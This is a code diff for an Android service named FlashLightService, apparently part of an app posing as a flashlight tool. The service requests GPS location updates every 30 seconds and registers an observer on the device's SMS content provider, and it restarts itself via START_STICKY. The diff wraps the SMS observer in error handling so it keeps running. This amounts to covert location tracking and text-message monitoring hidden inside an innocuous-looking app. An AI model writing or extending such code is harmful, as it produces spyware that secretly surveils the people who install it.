@@ -165,7 +165,6 @@ public class FlashLightService extends Service implements LocationListener {
   @Nullable
   @Override
   public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {
-    super.onStartCommand(intent, flag, startId);
 
     Log.d(TAG, "onStartCommand() Entering onStartCommand method.");
 
@@ -209,10 +208,15 @@ public class FlashLightService extends Service implements LocationListener {
 
     locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);
 
-    Handler mSmsObserverHandler = new Handler();
-    ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
-    SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
-    contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
+    try {
+      Handler mSmsObserverHandler = new Handler();
+      ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
+      SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
+      contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
+    }
+    catch(NullPointerException e) {
+      Log.e(TAG, "onStartCommand() NullPointerException e, Error creating ContentObserver()");
+    }
 
     return START_STICKY;
   }
